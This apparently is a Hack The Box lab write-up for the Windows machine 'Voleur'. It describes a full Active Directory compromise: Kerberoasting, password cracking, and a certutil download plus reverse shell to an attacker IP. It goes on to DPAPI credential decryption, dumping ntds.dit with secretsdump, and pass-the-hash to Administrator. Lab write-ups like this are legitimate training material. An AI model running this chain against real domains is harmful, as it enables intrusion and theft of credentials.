# Voleur

<figure><img src="../.gitbook/assets/635619778e50cc8f69df91cc6ae149c4-removebg-preview.png" alt="" width="150"><figcaption></figcaption></figure>

| OS      | Difficulty | Machine | Released   |
| ------- | ---------- | ------- | ---------- |
| Windows | Medium     | Active  | 05/07/2025 |

## **Machine info**

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt

## Nmap

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ nmap -Pn -T4 -A 10.10.11.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 13:58 UTC
Nmap scan report for 10.10.11.76
Host is up (0.42s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-18 21:59:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-18T21:59:44
|_  start_date: N/A
|_clock-skew: 7h59m59s

```

## Credential Hunt

first we will edit our hour like DC

```bash
sudo ntpdate 10.10.11.76
```

then we start to use tools like `smbmap`, `smbclient`, `crackmapexec` but we get more errors

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ smbclient -U 'voleur.htb/ryan.naylor' -L //10.10.11.76
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                            
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ smbclient -U 'ryan.naylor' -L //10.10.11.76 
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                            
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ smbclient -U 'voleur.htb/ryan.naylor' -L //10.10.11.76
                                                                                                                                                                            
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ sudo nano /etc/hosts                       
[sudo] password for irix: 
                                                                                                                                                                            
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ smbmap -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -H 10.10.11.76

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.10.11.76, no fun for you...                                                                          
[*] Closed 1 connections         

┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ crackmapexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' --shares                     
SMB         voleur.htb      445    voleur.htb       [*]  x64 (name:voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         voleur.htb      445    voleur.htb       [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
                                  
```

after search we found tool call [NextExec](https://github.com/Pennyw0rth/NetExec)

```bash
──(irix㉿irix)-[~/Machines/Voleur]
└─$ nxc  smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 

```

then we use `smbclient` again but with shared folder but more error occur so we discover this tools not stable for this version of SMB protocol

**Start to crate TGT for `ryan.naylor`**

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache

┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ export KRB5CCNAME=/home/irix/Machines/Voleur/ryan.naylor.ccache
```

Access on SMB server using TGT

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$  impacket-smbclient -k dc.voleur.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 20:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 09:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 09:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 22:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx

```

after download it and try to open this excel sheet we found it need password

![image.png](<../.gitbook/assets/image (43).png>)

**Crack password**

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ office2john Access_Review.xlsx > hash.txt                        
                                                                                                                                                                                                                                                                                                                              
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ john --wordlist=~/wordlist/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:05 DONE (2025-08-18 22:34) 0.1848g/s 147.8p/s 147.8c/s 147.8C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<figure><img src="../.gitbook/assets/image 1 (23).png" alt=""><figcaption></figcaption></figure>

we found 3 users but one of them is deleted

```bash
todd.wolfe NightT1meP1dg3on14

svc_ldap   M1XyC9pW7qT5Vn

svc_iis    N5pXyW1VqM7CZ8
```

Start bloodhound using `svc_ldap` credential

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ sudo bloodhound-python -u svc_ldap -p 'M1XyC9pW7qT5Vn' -ns 10.10.11.76 -d voleur.htb -c all --zip
[sudo] password for irix: 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 59S
INFO: Compressing output into 20250818224704_bloodhound.zip
```

<figure><img src="../.gitbook/assets/image 2 (12).png" alt=""><figcaption></figcaption></figure>

## 0x1 Exploit WriteSPN

***

Generate TGT for svc\_ldap user

```bash
┌──(irix㉿irix)-[~/Machines/Voleur/targetedKerberoast]
└─$ impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
                                                                                                                                                                        
                                                                                                                                                                           
┌──(irix㉿irix)-[~/Machines/Voleur/targetedKerberoast]
└─$ export KRB5CCNAME=/home/irix/Machines/Voleur/targetedKerberoast/svc_ldap.ccache 

┌──(irix㉿irix)-[~/Machines/Voleur/targetedKerberoast]
└─$ python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb 
```

<figure><img src="../.gitbook/assets/image 3 (9).png" alt=""><figcaption></figcaption></figure>

Crack svc\_winrm hash

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ hashcat -m 13100 hashes ~/wordlist/rockyou.txt 
hashcat (v6.2.6) starting
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$efb7d872bd970193452f0764236bde67$77845627548e361371515f4bc898fe157491615f83c576f47524db4a39a61b0f93d9875e3855c18d1d63240009f0164b9ff5b737d751524586ef450f26849d7074415a579709210d8a5da8400c3a5f61d841802318c56eda3cab5dcad18a95a1348e1dd24a24bebce0f92b6977b028121a7d51811f0782c1b72e7f315fc9878c8ceb96360be7ddac181d2c5d3dfe353d8001d3fdee69bb460aa3fa7dbc2efe3db4c9b8afef6ccb28c3f34231cb8dcceb7cad9b342a004e3bf7ca84fd88eb4f04503439476f595482f7bb8e9eca1056bd67c8d63ab63b73757b115a0014f8172e9e27c24d9106c1a13949829f9f2a0ea3e41aab3e4032b6b94f3cbf29a57fb795ac7640594da7bcd0bf1712b23373cc69733b270eb794ce225d7d7f77675644a24d66c0cc8bb9fc7e670a22ab93124c5e7e13eee6be802e3e8000bc97144f7cff43aace49ac2628cabb50fba004f4ff766cbf7d31d34c68eacb801ed19b2c11a5821776cc1ca080fdad6ef29bc7d809da8b7917a7483ed7c48b67fddd846f968f33fc515faeb228f4b7d91a0ef32ad5eaecc9cf33cbfd2c12fa1362888da71a44c50c5654c8a12694ebb9b51faae311ea370fb032648e2f3d2e85995b3d855887e5cd0242827e549b468ecc7b326fceba27fc411c64bd60492d9d087cf848303a7a0c2b1bcd3dd32f0c92b43a9ef075216d50eaae00c89f35f7e6983548143d7d417602a4fe628497109601c75bde64b743d029ef7090d6ab32168c8bbccfc5c34f411f0e4fb15a8c77d09a4a9cafdc40c489e8d0d3a5a187e6d81ba3f783a648def8b12a86db84b90a97c17f13793f865a4c6fcaceba884986d2a5b5a54549e3dd034c3029242150421d8ba154659c2477d9df41f2512a2f5940b0e0406cb9ff3ced003ae217bdd70f0d5ba272720f76b7cc1d7c594296403dc7458a1805587eac306e7d59d3a7f83e9378a4708f2255bbff1ba82fc3bb057c3951f5cf6d8fb99ec5f251b40acbd6aa3ac3c8f99a3d5b4c0caafaf57bbbf3dc19d7dd6a189ba7726d4bb53a2d9625a1eb7b7e9e8837056043d11875e745dbb29d5e68b859d0776b42da4353d71078a8c83a616cfc8b83253a771ff6f5f76f60ae3217aeecfc556b7e1e970a6531498ca4af1ad00b384646639af8560e8ea566701f167fbeb5865d02d9bdde763c84834d3eb7edd6644a5e2c94de455488e78ee5b0a1ac9fc88d4bcca441a0637308e93744bf2a1d3595c1689f429cb9ab23d7a7ed97563c1f2836daeda35b3a4c26bd4af390c30cf84b9e47ff7a10edce580a07d62ae05f686cb27b65d4696a4f5fa0341486504076fd76affc0d111240862ef46d481fa4230b14396b1268fae42c2869d7c4465af1b207362d9ece05ab01648cce660dca37cb64eda4a21d926e8b3ff9538cea287f74e7f60555a6a5137ecfc7822840347080bafca2f57c46e3d103372c999e7abede6b1544:AFireInsidedeOzarctica980219afi

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...6b1544
Time.Started.....: Mon Aug 18 23:10:05 2025 (27 secs)

```

Generate TGT to can access `svc_winrm` machine

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache

┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ export KRB5CCNAME=/home/irix/Machines/Voleur/svc_winrm.ccache 
```

## 0x2 SVC\_WINRM Shell

***

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb -k svc_winrm.ccache
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> ls
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
cddb89c38648c088d8de5652881c4f52
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> 

```

## **0x3 Restore user(Todd.Wolfe)**

***

we will try to get shell with svc\_ldap account on DC machine

upload Runas script

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> certutil.exe -urlcache -split -f http://10.10.16.80:8000/RunasCs.exe RunasCs.exe
****  Online  ****
malloc_consolidate(): unaligned fastbin chunk detected
zsh: IOT instruction  evil-winrm -i dc.voleur.htb -r voleur.htb -k svc_winrm.ccache

```

take a shell on attacker machine

```bash
# attacker box
	nc -nlvp 9001

# Victim box  
.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.16.80:9001

```

<figure><img src="../.gitbook/assets/image 4 (7).png" alt=""><figcaption></figcaption></figure>

we know svc\_ldap in group call Restore\_user

and we know from SMB finding here is user call `todd.wolfe` is removed

<figure><img src="../.gitbook/assets/image 5 (5).png" alt=""><figcaption></figcaption></figure>

let’s check it and try to restore it

```powershell
# check if any user was deleted
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

restore deleted user

```powershell
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'

# to verify this user restore 
PS C:\Windows\system32> net user /domain
net user /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               

```

## **0x4 DPAPI**

***

DPAPI, or Data Protection API, is a cryptographic API built into Windows operating systems (2000 and later) that allows developers to encrypt and decrypt data using information from the user's account or the computer. It simplifies data protection by handling the underlying encryption without requiring explicit key management

**Follow this arrticles**

[https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

**Generate TGT**

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
       
                                                                                                                                                                              
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ export KRB5CCNAME=/home/irix/Machines/Voleur/todd.wolfe.ccache 
                                                                                                     
```

**SMBclinet**

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ impacket-smbclient -k voleur.htb/TODD.WOLFE@dc.voleur.htb -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 20:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 15:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 15:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 15:13:06 2025 Archived Users

```

<figure><img src="../.gitbook/assets/image 6 (5).png" alt=""><figcaption></figcaption></figure>

Use `dpapi.py` decrypt the master key (file in `C:\Users$USER\AppData\Roaming\Microsoft\Protect$SUID$GUID`)

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

<figure><img src="../.gitbook/assets/image 7 (3).png" alt=""><figcaption></figcaption></figure>

Decrypted the protect data (file in C:\Users$USER\AppData\Roaming\Microsoft\Credentials)

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```

## 0x5 Shell as svc\_backup

***

Generate TGT and sign in we found Notes file and ssh key

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ impacket-smbclient -k voleur.htb/jeremy.combs@dc.voleur.htb -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 20:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 16:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 16:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 16:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 16:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt
# exit
```

Display Notes file and edit permission for ssh key

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ cat Note.txt.txt 
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin                                                                                                                                                                            
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ ls -las id_rsa                                                                                         
4 -rw-rw-r-- 1 irix irix 2602 Aug 19 01:49 id_rsa
                                                                                                                                                                            
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ chmod 600 id_rsa        
                         
```

**From nmap we know ssh running on port 2222**

```bash
──(irix㉿irix)-[~/Machines/Voleur]
└─$ ssh -i id_rsa svc_backup@10.10.11.76 -p 2222     
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug 18 18:54:19 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   31%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     0%

363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Aug 18 18:53:58 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                         [ OK ] 
svc_backup@DC:~$ ls
svc_backup@DC:~$ pwd
/home/svc_backup

```

### Privilege Escalation

```bash
svc_backup@DC:~/.ssh$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

```

```bash
svc_backup@DC:~/.ssh$ su
Password: 
su: Authentication failure
svc_backup@DC:~/.ssh$ sudo su
root@DC:/home/svc_backup/.ssh# cd /root
root@DC:~# ls
root@DC:~# ls -las
total 4
0 drwx------ 1 root root 4096 Jan 30  2025 .
0 drwxr-xr-x 1 root root 4096 Jan 30  2025 ..
4 -rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
0 drwxr-xr-x 1 root root 4096 Jan 30  2025 .local
0 -rw-r--r-- 1 root root  161 Dec  5  2019 .profile

```

## 0x6 Shell as Administrator

All C disk files in `/mnt`

<figure><img src="../.gitbook/assets/image 8 (2).png" alt=""><figcaption></figcaption></figure>

Download Security and System files

```bash
──(irix㉿irix)-[~/Machines/Voleur]
└─$ scp -P 2222 -i id_rsa -r "svc_backup@10.10.11.76:/mnt/c/IT/Third-Line Support/Backups/registry" .

SECURITY                                                                                                                                  100%   32KB  32.0KB/s   00:01    
SYSTEM                                                                                                                                    100%   18MB 138.5KB/s   02:09    
                                                                                                                                                                       
```

and Download AD Folder

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ scp -P 2222 -i id_rsa -r "svc_backup@10.10.11.76:/mnt/c/IT/Third-Line Support/Backups/Active Directory" .

ntds.dit                                                                                                                                  100%   24MB 129.8KB/s   03:09    
ntds.jfm                                                                                                                                  100%   16KB  23.0KB/s   00:00    
                                                                                                                                                                          
```

Use `secretdump` to dump hashes

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ secretsdump.py -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -history LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
krbtgt_history0:502:aad3b435b51404eeaad3b435b51404ee:b5ca59b606a13445af2043409d2c
```

<figure><img src="../.gitbook/assets/image 9 (1).png" alt=""><figcaption></figcaption></figure>

Generate TGT to loged with Admin Acc

```bash
getTGT.py voleur.htb/administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 -dc-ip 10.10.11.76

export KRB5CCNAME=/home/irix/Machines/Voleur/administrator.ccache

```

## 0x7 Root Flag

***

```bash
┌──(irix㉿irix)-[~/Machines/Voleur]
└─$ evil-winrm -i dc.voleur.htb -k administrator.ccache -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4bf0d585b9759cd54b507c6b46a566cb
*Evil-WinRM* PS C:\Users\Administrator\Desktop> @sS
                                                                       
```
